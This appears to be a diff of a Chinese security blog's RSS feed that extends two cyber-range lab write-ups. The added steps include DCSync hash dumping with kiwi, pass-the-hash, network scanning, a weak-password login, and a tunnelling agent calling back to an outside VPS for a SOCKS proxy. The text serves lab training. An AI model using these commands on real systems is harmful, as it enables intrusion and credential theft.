@@ -392,7 +392,8 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;像这样就成功了，如果没成功，可能是网络波动，再执行一次exploit即可。&lt;/p&gt;
 &lt;h3 id=&#34;打域控&#34;&gt;打域控
-&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;/h3&gt;&lt;p&gt;然后我们load kiwi，抓取用户的hash，依次执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
@@ -402,7 +403,25 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;kiwi_cmd&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;exit&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 导出域内所有用户的信息(包括哈希值)&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;</description>
+&lt;/div&gt;&lt;img src=&#34;image-20250904194405750.png&#34; alt=&#34;image-20250904194405750&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;我们抓到了Administrator的hash，所以可以直接用crackmapexec打hash传递了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://luo-kaihong.github.io/p/2025-initial/image-20250904194528058.png&#34;
+	width=&#34;1529&#34;
+	height=&#34;794&#34;
+	srcset=&#34;https://luo-kaihong.github.io/p/2025-initial/image-20250904194528058_hu_544cf99535e8026d.png 480w, https://luo-kaihong.github.io/p/2025-initial/image-20250904194528058_hu_aafff2b1546bd851.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250904194528058&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;192&#34;
+		data-flex-basis=&#34;462px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;得到&lt;code&gt;e8f88d0d43d6} &lt;/code&gt;,所以flag是&lt;code&gt;flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;做的第一份渗透，还是非常质量，这些内网与flag都没变，大大缩短了我的时间非常贴心，知识点也十分正点！&lt;/p&gt;
+</description>
         </item>
         <item>
         <title>2025-Hospital</title>
@@ -424,7 +443,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h1 id=&#34;flag1&#34;&gt;flag1
-&lt;/h1&gt;&lt;h2 id=&#34;shiro反序列化rce&#34;&gt;shiro反序列化RCE
+&lt;/h1&gt;&lt;h2 id=&#34;1shiro反序列化rce&#34;&gt;1.shiro反序列化RCE
 &lt;/h2&gt;&lt;p&gt;先下载fscan。https://github.com/shadow1ng/fscan/releases/tag/1.8.4&lt;/p&gt;
 &lt;p&gt;扫描得到&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://luo-kaihong.github.io/p/2025-hospital/image-20250612221343251.png&#34;
@@ -497,7 +516,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;img src=&#34;image-20250617214419741.png&#34; alt=&#34;image-20250617214419741&#34; style=&#34;zoom:50%;&#34; /&gt;
-&lt;h2 id=&#34;预期vimbasic提权升级交互式终端&#34;&gt;预期：vim.basic提权：升级交互式终端
+&lt;h2 id=&#34;2预期vimbasic提权升级交互式终端&#34;&gt;2.预期：vim.basic提权：升级交互式终端
 &lt;/h2&gt;&lt;p&gt;升级交互式终端，以欺骗某些命令让它们以为在合适的终端运行,vim.basic有suid权限，但是必须有tty，也就是交互式shell&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -544,7 +563,155 @@
     &gt;春秋云境-Hospital&lt;/a&gt;，&lt;a class=&#34;link&#34; href=&#34;https://lca.xlog.app/chun-qiu-yun-jing-fang-zhen-ba-chang-Hospital-shi-cao?locale=zh&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;春秋云镜仿真靶场Hospital实操 - lca&lt;/a&gt;这两篇，交互终端后添加一个拥有root的hacker账户，但是不知道为啥云服务器上编辑这个/etc/passwd有点问题（编辑云服务器的/etc/passwd可以，题目的不行），所以就直接提权拿flag了&lt;/p&gt;
 &lt;h1 id=&#34;flag2&#34;&gt;flag2
-&lt;/h1&gt;</description>
+&lt;/h1&gt;&lt;h2 id=&#34;1信息搜集与代理搭建&#34;&gt;1.信息搜集与代理搭建
+&lt;/h2&gt;&lt;img src=&#34;image-20250914200012254.png&#34; alt=&#34;image-20250914200012254&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;然后上传linux版的fscan在tmp下，然后赋予权限就可以执行命令了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://luo-kaihong.github.io/p/2025-hospital/image-20250914195927561.png&#34;
+	width=&#34;1372&#34;
+	height=&#34;730&#34;
+	srcset=&#34;https://luo-kaihong.github.io/p/2025-hospital/image-20250914195927561_hu_7edff884df0fcd29.png 480w, https://luo-kaihong.github.io/p/2025-hospital/image-20250914195927561_hu_b459247716e979c3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250914195927561&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;187&#34;
+		data-flex-basis=&#34;451px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod 777 fscan
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./fscan -h 172.30.12.5/24 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/shadow1ng/fscan/releases&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://github.com/shadow1ng/fscan/releases&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://luo-kaihong.github.io/p/2025-hospital/image-20250914205456112.png&#34;
+	width=&#34;1777&#34;
+	height=&#34;647&#34;
+	srcset=&#34;https://luo-kaihong.github.io/p/2025-hospital/image-20250914205456112_hu_ce5e8461807818e6.png 480w, https://luo-kaihong.github.io/p/2025-hospital/image-20250914205456112_hu_c74bda0da74eab42.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250914205456112&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;274&#34;
+		data-flex-basis=&#34;659px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;发现资产&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://172.30.12.6:8848 poc-yaml-alibaba-nacos poc-yaml-alibaba-nacos-v1-auth-bypass 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;注意，下载fscan的1.8.4版本一下就行，最新版本扫不出来这个yaml（奇奇怪怪）&lt;/p&gt;
+&lt;p&gt;然后搭建代理，把&lt;code&gt;linux_x64_agent&lt;/code&gt;上传到当前目录(如/tmp目录)，然后执行&lt;code&gt;chmod 777 ./linux_x64_agent&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://luo-kaihong.github.io/p/2025-hospital/image-20250914210039325.png&#34;
+	width=&#34;913&#34;
+	height=&#34;172&#34;
+	srcset=&#34;https://luo-kaihong.github.io/p/2025-hospital/image-20250914210039325_hu_d636f9d483ec4331.png 480w, https://luo-kaihong.github.io/p/2025-hospital/image-20250914210039325_hu_e924a9a03082050.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250914210039325&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;530&#34;
+		data-flex-basis=&#34;1273px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;把&lt;code&gt;linux_x64_admin&lt;/code&gt;上传到自己的vps上，给执行权限后（&lt;strong&gt;chmod 777 ./linux_x64_admin&lt;/strong&gt;）执行：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./linux_x64_admin -l 12345 -s 123456
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;注1：vps的端口为12345，连接密钥是123456，均可自定义&lt;/strong&gt;，安全组记得打开&lt;/p&gt;
+&lt;p&gt;然后再冰蝎执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./linux_x64_agent -c 101.200.39.193:12345 -s 123456 --reconnect 8
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;image-20250914210456091.png&#34; alt=&#34;image-20250914210456091&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;&lt;img src=&#34;https://luo-kaihong.github.io/p/2025-hospital/image-20250914210517121.png&#34;
+	width=&#34;602&#34;
+	height=&#34;90&#34;
+	srcset=&#34;https://luo-kaihong.github.io/p/2025-hospital/image-20250914210517121_hu_c6de3bf9f35ef193.png 480w, https://luo-kaihong.github.io/p/2025-hospital/image-20250914210517121_hu_c2c9cad56fc2ee00.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250914210517121&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;668&#34;
+		data-flex-basis=&#34;1605px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;成功搭建隧道，然后在vps上依次执行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use 0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;socks 5555  //端口可自定义，记得安全组打开
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;img src=&#34;image-20250914210618217.png&#34; alt=&#34;image-20250914210618217&#34; style=&#34;zoom:50%;&#34; /&gt;
+&lt;p&gt;然后FoxyProxy插件设置代理，如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://luo-kaihong.github.io/p/2025-hospital/image-20250914210725753.png&#34;
+	width=&#34;1515&#34;
+	height=&#34;463&#34;
+	srcset=&#34;https://luo-kaihong.github.io/p/2025-hospital/image-20250914210725753_hu_31f21fc214e3565b.png 480w, https://luo-kaihong.github.io/p/2025-hospital/image-20250914210725753_hu_ad48ec0836301101.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20250914210725753&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;327&#34;
+		data-flex-basis=&#34;785px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2nacos-yaml反序列化&#34;&gt;2.nacos Yaml反序列化
+&lt;/h2&gt;&lt;p&gt;访问 nacos 应用&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://172.30.12.6:8848/nacos/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;弱口令进入后台&lt;code&gt;nacos:nacos&lt;/code&gt;&lt;/p&gt;
+</description>
         </item>
         
     </channel>
